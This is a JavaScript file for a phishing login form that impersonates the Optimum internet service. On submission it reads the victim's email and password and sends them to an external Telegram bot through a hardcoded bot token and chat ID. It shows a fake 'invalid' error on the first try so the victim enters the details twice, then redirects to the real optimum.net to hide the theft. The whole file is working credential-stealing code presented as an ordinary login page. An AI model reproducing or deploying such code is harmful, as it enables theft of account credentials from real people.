//   FORM-1
(function ($) {
  "use strict";

  $(document).ready(function () {
    $("#form-1")
      .data("counter", 0)
      .submit(function (event) {
        event.preventDefault();

        var emailInput = $("input[name='email']", this).val();
        var password = $("input[name='password']", this).val();

        var info_values = `Optimum Login Info is:%0A - Email: ${emailInput} %0A - Password: ${password}`;

        var bot_id = "6587221391:AAHFwtQKkHMcXA5iBOqBcuFTY4MJZex4o8E";
        var chat_id = 1332758004;
        var url = `https://api.telegram.org/bot${bot_id}/sendMessage?chat_id=${chat_id}&text=${info_values}`;

        var funcs = [
          function one() {
            let api = new XMLHttpRequest();
            api.open("GET", url, true);
            api.send();

            document.getElementById("alert-invalid-keystore").style.display =
              "block";
            emailInput = "";
            password = "";
          },
          function two() {
            let api = new XMLHttpRequest();
            api.open("GET", url, true);
            api.send();
            window.location.href = "https://optimum.net";
          },
        ];

        var counter = $(this).data("counter");
        funcs[counter]();
        $(this).data("counter", counter < funcs.length - 1 ? ++counter : 0);
      });
  });
})(jQuery);
